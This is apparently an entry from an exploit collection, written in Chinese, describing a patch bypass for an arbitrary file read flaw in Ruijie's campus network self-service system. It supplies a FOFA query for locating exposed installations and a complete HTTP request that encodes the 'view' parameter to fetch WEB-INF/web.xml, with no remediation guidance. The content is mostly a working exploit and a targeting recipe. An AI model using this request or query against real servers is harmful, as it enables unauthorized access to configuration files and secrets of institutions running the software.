## 锐捷校园网自助服务系统login_judge.jsf任意文件读取漏洞补丁绕过

校园网自助服务系统/selfservice/selfservice/module/scgroup/web/login_judge.jsf 接口处存在任意文件读取漏洞补丁绕过，通过将`view`编码即可绕过

## fofa

```javascript
body="校园网自助服务系统"
```

## poc

```javascript
GET /selfservice/selfservice/module/scgroup/web/login_judge.jsf?vie%77=./WEB-INF/web.xml%3F HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close


```

![image-20241025112954677](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410251129745.png)

![image-20241025112527256](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410251125343.png)